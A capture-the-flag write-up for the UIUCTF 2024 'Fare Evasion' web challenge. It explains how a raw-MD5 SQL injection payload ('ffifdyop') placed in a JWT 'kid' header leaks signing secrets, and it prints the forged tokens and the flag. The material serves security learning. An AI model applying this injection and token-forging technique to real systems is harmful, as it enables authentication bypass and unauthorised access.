# Writeup for Fare Evasion challenge hosted in UIUCTF 2024

![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/9bf0e398-d557-406f-892c-88d1b057a0f6)

on opening the challenge, we're greeted with this page and when we click the only button we can ("I'm a passenger"), this appears

![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/b70ce90e-b6d9-4ee2-b43b-9d0ba1531fbe)

now, looking at the cookies being sent to get this message, we'll see this - 

![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/b77f226f-e40b-4360-bf8f-ec54c8fb5eb7)
there is a jwt cookie being sent. On decoding it, we see there are few parameters
the headers look like - 
```
{
  "alg": "HS256",
  "kid": "passenger_key",
  "typ": "JWT"
}
```
and the data looks like - 
```
{
  "type": "passenger"
}
```
In the *page source* we see
```
<script>
    async function pay() {
      // i could not get sqlite to work on the frontend :(
      /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
       */
      const r = await fetch("/pay", { method: "POST" });
      const j = await r.json();
      document.getElementById("alert").classList.add("opacity-100");
      // todo: convert md5 to hex string instead of latin1??
      document.getElementById("alert").innerText = j["message"];
      setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
    }
  </script>
```
They have mentioned how they are retrieving the passenger key from the database in comments. It probably means they want us to know that an sqli is possible here. We see that they are using raw md5 while storing and retrieving data. The problem with this is that, any kind of characters can be in the raw md5, so all we need to do is find a string such that when it is hashed in md5, it will look something like - ` ' or '1` so that we can do sqli attack and get all records in the database.

I found the string "ffifdyop" which matches our need, from the url - 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#authentication-bypass-raw-md5-sha1

So we need to put that in the `kid` parameter in the head of the jwt token and sign the jwt with the secret they have given us - `a_boring_passenger_signing_key_?` to get the jwt `eyJhbGciOiJIUzI1NiIsImtpZCI6ImZmaWZkeW9wIiwidHlwIjoiSldUIn0.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.zgePz4fg9QKihcFTuT8SEYy0vIwNnIuNSmb7vZuNVrE` 
 and we get response looking like - 
```
"Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed \u00f4\u008c\u00f7u\u009e\u00deIB\u0090\u0005\u0084\u009fB\u00e7\u00d9+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?"
```
now all I do is sign the previous jwt with the new secret that they have given us - `conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e`
and get the jwt
`eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0._svKe3YzdQdpJbS7DGr9yOIXzpxza9sKNuxQBEeCHcU`

# obtaining the flag - 
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/8b1fc819-f5bb-4dcc-8959-359de801ce1f)
`uiuctf{sigpwny_does_not_condone_turnstile_hopping!}`
# conclusion
I used raw md5 for sqli for first time in this challenge. And this is the first time I see that the secret is used for identifying the content of the jwt.
